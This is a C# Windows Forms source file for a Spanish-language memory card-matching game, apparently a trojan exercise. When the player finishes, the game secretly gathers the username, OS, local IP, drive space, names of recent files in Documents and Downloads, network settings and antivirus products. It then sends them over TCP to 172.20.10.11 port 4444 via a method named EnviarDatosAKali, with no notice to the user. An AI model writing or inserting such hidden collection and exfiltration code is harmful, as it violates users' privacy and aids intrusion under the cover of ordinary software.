using System.Collections;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;

namespace Juego
{
    public partial class Form1 : Form
    {
        int TamanioColumnasFilas = 4;
        int Movimientos = 0;
        int CantidadDeCartasVolteadas = 0;
        List<string> CartasEnumeradas;
        List<string> CartasRevueltas;
        ArrayList CartasSeleccionadas;
        PictureBox CartaTemporal1;
        PictureBox CartaTemporal2;
        int CartaActual = 0;
        public Form1()
        {
            InitializeComponent();
            iniciarJuego();
        


        }
        public void iniciarJuego()
        {
            timer1.Enabled = false;
            timer1.Stop();
            lblRecord.Text = "0";
            CantidadDeCartasVolteadas = 0;
            Movimientos = 0;
            PanelJuego.Controls.Clear();
            CartasEnumeradas = new List<string>();
            CartasRevueltas = new List<string>();
            CartasSeleccionadas = new ArrayList();
            for (int i = 0; i < 8; i++)
            {
                CartasEnumeradas.Add(i.ToString());
                CartasEnumeradas.Add(i.ToString());
            }
            var NumeroAleatorio = new Random();
            var Resultado = CartasEnumeradas.OrderBy(item => NumeroAleatorio.Next());
            foreach (string ValorCarta in Resultado)
            {
                CartasRevueltas.Add(ValorCarta);
            }
            var tablaPanel = new TableLayoutPanel();
            tablaPanel.RowCount = TamanioColumnasFilas;
            tablaPanel.ColumnCount = TamanioColumnasFilas;
            for (int i = 0; i < TamanioColumnasFilas; i++)
            {
                var Porcentaje = 150f / (float)TamanioColumnasFilas - 10;
                tablaPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, Porcentaje));
                tablaPanel.RowStyles.Add(new RowStyle(SizeType.Percent, Porcentaje));
            }
            int contadorFichas = 1;
            for (var i = 0; i < TamanioColumnasFilas; i++)
            {
                for (var j = 0; j < TamanioColumnasFilas; j++)
                {
                    var CartasJuego = new PictureBox();
                    CartasJuego.Name = string.Format("{0}", contadorFichas);
                    CartasJuego.Dock = DockStyle.Fill;
                    CartasJuego.SizeMode = PictureBoxSizeMode.StretchImage;
                    CartasJuego.Image = Properties.Resources.Girada;
                    CartasJuego.Cursor = Cursors.Hand;
                    CartasJuego.Click += btnCarta_Click;
                    tablaPanel.Controls.Add(CartasJuego, j, i);
                    contadorFichas++;
                    ;
                }
            }
            tablaPanel.Dock = DockStyle.Fill;
            PanelJuego.Controls.Add(tablaPanel);
        }
        private void btnReiniciar_Click(object sender, EventArgs e)
        {
            iniciarJuego();

        }
        private void btnCarta_Click(object sender, EventArgs e)
        {
            if (CartasSeleccionadas.Count < 2)
            {
                Movimientos++;
                lblRecord.Text = Convert.ToString(Movimientos);
                var CartasSeleccionadasUsuario = (PictureBox)sender;

                CartaActual = Convert.ToInt32(CartasRevueltas[Convert.ToInt32(CartasSeleccionadasUsuario.Name) - 1]);
                CartasSeleccionadasUsuario.Image = RecuperarImagen(CartaActual);
                CartasSeleccionadas.Add(CartasSeleccionadasUsuario);
                if (CartasSeleccionadas.Count == 2)
                {
                    CartaTemporal1 = (PictureBox)CartasSeleccionadas[0];
                    CartaTemporal2 = (PictureBox)CartasSeleccionadas[1];
                    int Carta1 = Convert.ToInt32(CartasRevueltas[Convert.ToInt32(CartaTemporal1.Name) - 1]);
                    int Carta2 = Convert.ToInt32(CartasRevueltas[Convert.ToInt32(CartaTemporal2.Name) - 1]);
                    if (Carta1 != Carta2)
                    {
                        timer1.Enabled = true;
                        timer1.Start();
                    }
                    else
                    {
                        CantidadDeCartasVolteadas++;
                        if (CantidadDeCartasVolteadas > 7)
                        {
                            MessageBox.Show("El juego termino");
                             string info = ObtenerInformacionSistema();
                            EnviarDatosAKali(info);
                        }
                        CartaTemporal1.Enabled = false; CartaTemporal2.Enabled = false;
                        CartasSeleccionadas.Clear();
                    }
                }
            }
        }
        public Bitmap RecuperarImagen(int NumeroImagen)
        {
            Bitmap TmpImg = new Bitmap(200, 100);
            switch (NumeroImagen)
            {
                case 0:
                    TmpImg = Properties.Resources.img1;
                    break;
                default:
                    TmpImg = (Bitmap)Properties.Resources.ResourceManager.GetObject("img" + NumeroImagen);
                    break;
            }
            return TmpImg;

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            int TiempoVirarCarta = 1;
            if (TiempoVirarCarta == 1)
            {
                CartaTemporal1.Image = Properties.Resources.Girada;
                CartaTemporal2.Image = Properties.Resources.Girada;
                CartasSeleccionadas.Clear();
                timer1.Stop();
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            iniciarJuego();
        }

        private void lblRecord_Click(object sender, EventArgs e)
        {

        }
        public string ObtenerInformacionSistema()
        {
            string info = "";

          
            info += $"Usuario: {Environment.UserName}\n";

            info += $"Idioma del sistema: {CultureInfo.CurrentCulture.DisplayName}\n";

           
            info += $"Zona horaria: {TimeZoneInfo.Local.DisplayName}\n";

            info += $"Hora actual: {DateTime.Now}\n";

       
            info += $"Tiempo encendida (minutos): {Environment.TickCount / 60000}\n";

          
            info += $"Sistema Operativo: {Environment.OSVersion}\n";

            string ipLocal = Dns.GetHostEntry(Dns.GetHostName())
                                .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)?.ToString();
            info += $"IP Local: {ipLocal}\n";

            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                if (d.IsReady)
                {
                    info += $"Unidad {d.Name} - Espacio libre: {d.TotalFreeSpace / (1024 * 1024)} MB\n";
                }
            }

        
            string[] carpetas = { Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                          Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads" };

            foreach (string carpeta in carpetas)
            {
                if (Directory.Exists(carpeta))
                {
                    var archivos = Directory.GetFiles(carpeta)
                                            .OrderByDescending(f => File.GetLastWriteTime(f))
                                            .Take(5);
                    info += $"\nArchivos recientes en {carpeta}:\n";
                    foreach (var archivo in archivos)
                    {
                        info += $" - {Path.GetFileName(archivo)}\n";
                    }
                }
            }

            
            info += "\nInformaci√≥n de red:\n";
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                var ipProps = ni.GetIPProperties();
                foreach (var dns in ipProps.DnsAddresses)
                {
                    info += $"DNS: {dns}\n";
                }

                var gateway = ipProps.GatewayAddresses.FirstOrDefault();
                if (gateway != null)
                {
                    info += $"Puerta de enlace: {gateway.Address}\n";
                }
            }

         
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
                foreach (ManagementObject obj in searcher.Get())
                {
                    info += $"Antivirus: {obj["displayName"]}\n";
                }
            }
            catch
            {
                info += "Antivirus: No se pudo obtener (requiere permisos)\n";
            }

            return info;
        }
        public void EnviarDatosAKali(string datos)
        {
            try
            {
                TcpClient client = new TcpClient("172.20.10.11", 4444); 
                NetworkStream stream = client.GetStream();
                byte[] data = Encoding.UTF8.GetBytes(datos);
                stream.Write(data, 0, data.Length);
                stream.Close();
                client.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error al enviar datos: " + ex.Message);
            }
        }




        private void PanelJuego_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}
